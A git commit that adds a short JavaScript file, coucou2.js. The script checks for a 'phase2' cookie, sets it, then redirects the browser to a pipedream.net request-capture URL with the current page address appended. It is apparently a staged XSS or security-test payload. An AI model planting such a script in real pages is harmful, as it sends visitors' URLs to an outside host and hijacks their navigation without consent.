e6e18c51a7807d51bf8ebe608663c158deafebe1
JB Lézoray <jlezoray@synamedia.com>
2023-11-26 00:40:53 +0100

    Create coucou2.js

---
+++ coucou2.js
@@ -0,0 +1,7 @@
+
+if (document.cookie.includes("phase2") == false) {
+    document.cookie = "phase2=true" 
+    window.location.replace("https://ensgnh0kr2ws.x.pipedream.net?phase2="+window.location.href);
+}        
+
+
